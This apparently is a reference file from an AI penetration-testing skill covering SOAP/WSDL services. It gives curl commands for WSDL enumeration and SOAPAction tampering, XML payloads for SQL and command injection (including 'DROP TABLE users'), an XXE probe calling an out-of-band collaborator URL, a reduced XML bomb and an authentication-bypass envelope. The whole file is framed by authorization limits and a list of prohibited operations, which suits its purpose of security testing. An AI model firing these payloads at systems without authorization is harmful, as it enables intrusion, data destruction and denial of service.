# SOAP / WSDL Web Service Testing Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify SOAP/WSDL web service vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual service exploitation prohibited
> - SOAP injection and WSDL enumeration are for understanding attack surface only, **no unauthorized data access**
> - Validation proves vulnerability existence (injection confirmed, WSDL exposed), **no data exfiltration or service manipulation**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: OWASP Testing Guide, WS-Attacker, PayloadAllTheThings

## Manual Testing

**Note: Test SOAP services methodically, maximum 8 probes per operation**

---

## Validation Objectives (Within Security Boundary)

SOAP/WSDL web service vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| WSDL Enumeration | ✓ Discover service definitions | - | Unauthorized service access |
| SOAP Injection | ✓ Test for injection in parameters | - | Execute system commands |
| WSDL Disclosure | ✓ Confirm WSDL accessibility | - | Abuse service operations |
| SOAP Action Tampering | ✓ Test action field manipulation | - | Invoke unauthorized operations |
| XML-based Attacks | ✓ Test XXE in SOAP messages | - | Read server files |
| SOAP Message Security | ✓ Check WS-Security configuration | - | Replay intercepted messages |

**Safe Validation Method**: Enumerate WSDL to understand attack surface, test injection with harmless markers, verify vulnerability existence without exploiting services.

---

## WSDL Enumeration

### WSDL Discovery

```bash
# Common WSDL paths
for path in "?wsdl" "?WSDL" ".wsdl" "/wsdl" "/service?wsdl" "/api?wsdl" "/soap?wsdl" "/ws?wsdl"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] ${path} -> ${status}"
  fi
done

# Check for WSDL in common locations
curl -s "https://target.com/?wsdl" | grep -i "wsdl\|definitions\|service"
curl -s "https://target.com/soap/?wsdl" | grep -i "wsdl\|definitions\|service"
curl -s "https://target.com/wsdl" | grep -i "wsdl\|definitions\|service"
```

### WSDL Analysis

```bash
# Download and parse WSDL
curl -s "https://target.com/?wsdl" > wsdl.xml

# Extract service information
grep -i "service name" wsdl.xml
grep -i "operation name" wsdl.xml
grep -i "port type" wsdl.xml
grep -i "binding" wsdl.xml

# Extract endpoints
grep -i "location\|address" wsdl.xml

# Extract message types
grep -i "element name\|complexType\|simpleType" wsdl.xml

# Extract available operations (most important for testing)
grep -oP 'operation name="\K[^"]+' wsdl.xml
```

### Key WSDL Information

| Information | Purpose | How to Extract |
|------------|---------|---------------|
| Service name | Identify service | `grep -i "service name"` |
| Operations | Attack surface | `grep -oP 'operation name="\K[^"]+'` |
| Endpoints | Target URLs | `grep -i "location\|address"` |
| Parameters | Injection points | `grep -i "element name"` |
| Auth requirements | Security level | `grep -i "security\|auth\|token"` |

---

## SOAP Injection

### Basic SOAP Injection Test

```xml
<!-- Test parameter injection -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:GetUser>
         <ser:userId>1' OR '1'='1</ser:userId>
      </ser:GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

### SOAP Injection with Harmless Marker

```xml
<!-- Test injection with marker -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.example.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:SearchUser>
         <ser:username>test&quot;&gt;&lt;!--INJECTION_PROBE--&gt;</ser:username>
      </ser:SearchUser>
   </soapenv:Body>
</soapenv:Envelope>
```

### SOAP Command Injection Test (Proof Only)

```xml
<!-- ⚠️ Only for detection, do not execute -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:ProcessData>
         <ser:input>test; echo INJECTION_PROBE</ser:input>
      </ser:ProcessData>
   </soapenv:Body>
</soapenv:Envelope>
```

### Type Confusion Injection

```xml
<!-- Test type confusion -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:GetUser>
         <ser:userId xsi:type="xs:string">1; DROP TABLE users--</ser:userId>
      </ser:GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

---

## WSDL Disclosure Testing

```bash
# Test WSDL disclosure on various endpoints
curl -s "https://target.com/?wsdl" -H "SOAPAction: \"\"" | head -20
curl -s "https://target.com/?wsdl" -H "Content-Type: application/wsdl+xml" | head -20

# Test WSDL with different HTTP methods
curl -s -X POST "https://target.com/?wsdl" -H "Content-Type: application/soap+xml" | head -20

# Check for internal WSDL
curl -s "https://target.com/internal?wsdl" | grep -i "wsdl"
curl -s "https://target.com/admin?wsdl" | grep -i "wsdl"
```

---

## SOAP Action Tampering

### SOAPAction Header Manipulation

```bash
# Test with empty SOAPAction
curl -s -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: ""' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>'

# Test with different SOAPAction
curl -s -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "http://service.example.com/GetAdmin"' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>'

# Test SOAPAction bypass
curl -s -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "http://service.example.com/GetUser"' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ser:GetAdmin/></soapenv:Body></soapenv:Envelope>'
```

### SOAPAction Mismatch Test

```bash
# Mismatch SOAPAction header with body operation
# If server processes based on body: Action header bypass possible
# If server processes based on header: Body bypass possible

curl -s -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "OperationA"' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ser:OperationB/></soapenv:Body></soapenv:Envelope>'
```

---

## XML-Based Attacks on SOAP Services

### XXE in SOAP Messages

```xml
<!-- XXE detection in SOAP parameter -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:GetUser>
         <ser:userId><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR_URL">]><foo>&xxe;</foo>]]></ser:userId>
      </ser:GetUser>
   </soapenv:Body>
</soapenv:Envelope>

<!-- XXE via CDATA (safer probe) -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:ProcessData>
         <ser:input>&xxe;</ser:input>
      </ser:ProcessData>
   </soapenv:Body>
</soapenv:Envelope>
```

### XML Bomb (Billion Laughs) - Detection Only

```xml
<!-- ⚠️ Only for detection, use with extreme caution -->
<!-- Reduced payload for testing (not full billion laughs) -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:ProcessData>
         <ser:input><![CDATA[<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>]]></ser:input>
      </ser:ProcessData>
   </soapenv:Body>
</soapenv:Envelope>
```

---

## SOAP Message Security

### WS-Security Check

```bash
# Check for WS-Security requirements in WSDL
curl -s "https://target.com/?wsdl" | grep -i "security\|wsse\|signature\|encryption\|token\|username\|password"

# Check SOAP response headers
curl -s -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "test"' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ser:Test/></soapenv:Body></soapenv:Envelope>' \
  -D response_headers.txt

cat response_headers.txt | grep -i "security\|auth\|token"
```

### Authentication Bypass Testing

```xml
<!-- Test without authentication -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <ser:GetPublicData/>
   </soapenv:Body>
</soapenv:Envelope>

<!-- Test with empty credentials -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
   <soapenv:Header>
      <wsse:Security>
         <wsse:UsernameToken>
            <wsse:Username></wsse:Username>
            <wsse:Password></wsse:Password>
         </wsse:UsernameToken>
      </wsse:Security>
   </soapenv:Header>
   <soapenv:Body>
      <ser:GetUserData/>
   </soapenv:Body>
</soapenv:Envelope>
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP Web | A03:2021-Injection |
| CWE | CWE-20: Improper Input Validation |
| CWE | CWE-77: Improper Neutralization of Special Elements Used in a Command ('Command Injection') |

---

## Analysis Process

1. Discover WSDL files through common paths and parameters
2. Parse WSDL to enumerate operations, parameters, endpoints
3. Test SOAP injection in each operation parameter
4. Test SOAPAction header tampering (mismatch header vs body)
5. Check for XXE in SOAP message processing
6. Evaluate WS-Security configuration
7. Test authentication bypass patterns
8. **Stop validation**, report findings without exploiting services

---

## Output

```markdown
## Vulnerability: SOAP/WSDL Security Issues

### Location
{URL} - {SOAP endpoint / WSDL URL}

### Type
{WSDL Disclosure / SOAP Injection / SOAPAction Tampering / XXE / Auth Bypass}

### WSDL Information
- Operations: {list of operations}
- Endpoints: {list of endpoints}
- Auth required: {yes/no}

### Evidence
- WSDL accessible: {yes/no, URL}
- Injection vulnerable parameter: {parameter name}
- SOAPAction mismatch processed: {yes/no}
- XXE confirmed: {yes/no}

### Validation Result
- WSDL disclosure: {yes/no}
- SOAP injection: {parameter, type}
- SOAPAction tampering: {yes/no}
- XXE vulnerability: {yes/no}
- Auth bypass possible: {yes/no}

### Risk Level
{Critical/High/Medium} - {issue type} enables {attack type} at {endpoint}
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Execute system commands | SOAP injection proof only, no OS command execution |
| ❌ Invoke unauthorized operations | Only test with authorized operations |
| ❌ Read server files via XXE | Only prove XXE with OOB callback |
| ❌ Replay intercepted messages | Only document WS-Security weaknesses |
| ❌ Denial of service with XML bombs | Only test with reduced payload |
| ❌ Access unauthorized data | Only prove vulnerability existence |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "No command execution via SOAP"
- `README.md` -> Prohibited execution checklist